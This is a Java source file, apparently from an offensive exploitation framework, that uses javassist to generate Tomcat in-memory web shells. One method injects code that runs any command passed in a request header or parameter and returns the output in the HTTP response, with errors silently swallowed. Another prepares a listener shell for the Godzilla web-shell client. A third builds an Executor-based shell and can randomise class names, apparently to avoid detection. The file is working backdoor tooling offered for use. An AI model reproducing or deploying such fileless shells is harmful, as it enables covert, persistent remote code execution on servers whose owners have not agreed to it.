package com.ppp.middleware.builder;

import com.ppp.JavaClassHelper;
import com.ppp.annotation.Builder;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;
import com.ppp.annotation.Middleware;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

/**
 * @author Whoopsunix
 */
@Builder(Builder.MS)
public class MSJavaClassBuilder {
    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] listenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
        responseCtMethod.setBody("{Object request = getFieldValue($1, \"request\");\n" +
                "Object httpServletResponse = getFieldValue(request, \"response\");\n" +
                "return httpServletResponse;}");

        // run
        CtMethod runCtMethod = ctClass.getDeclaredMethod("run");
        runCtMethod.setBody("{try {\n" +
                "    Object httpServletRequest = invokeMethod($1, \"getServletRequest\", new Class[]{}, new Object[]{});\n" +
                "    Object header =  invokeMethod(httpServletRequest, \"getHeader\", new Class[]{String.class}, new Object[]{HEADER});\n" +
                "    Object param = invokeMethod(httpServletRequest, \"getParameter\", new Class[]{String.class}, new Object[]{PARAM});\n" +
                "    String str = null;\n" +
                "    if (header != null) {\n" +
                "        str = (String) header;\n" +
                "    } else if (param != null) {\n" +
                "        str = (String) param;\n" +
                "    }\n" +
                "    String result = exec(str);\n" +
                "    Object response = getResponse(httpServletRequest);\n" +
                "    invokeMethod(response, \"setStatus\", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});\n" +
                "    Object writer = invokeMethod(response, \"getWriter\", new Class[]{}, new Object[]{});\n" +
                "    invokeMethod(writer, \"println\", new Class[]{String.class}, new Object[]{result});\n" +
                "} catch (Exception ignored) {\n" +
//                "    ignored.printStackTrace();\n" +
                "}}");

        // 字段信息修改
        JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);

        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
    }

    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] listenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        // response
        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
        responseCtMethod.setBody("{Object request = getFieldValue($1, \"request\");\n" +
                "Object httpServletResponse = getFieldValue(request, \"response\");\n" +
                "return httpServletResponse;}");

        // 字段信息修改
        JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);

        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
    }

    @MemShell(MemShell.Executor)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] executorExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        if (javaClassHelper.isRandomJavaClassName()) {
            // 随机类名
            String javaClassName = JavaClassModifier.randomJavaClassName(javaClassHelper);
            javaClassHelper.setCLASSNAME(javaClassName);
        } else {
            javaClassHelper.setCLASSNAME(cls.getName());
        }
        // 字段信息修改
        JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);

        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
    }
}
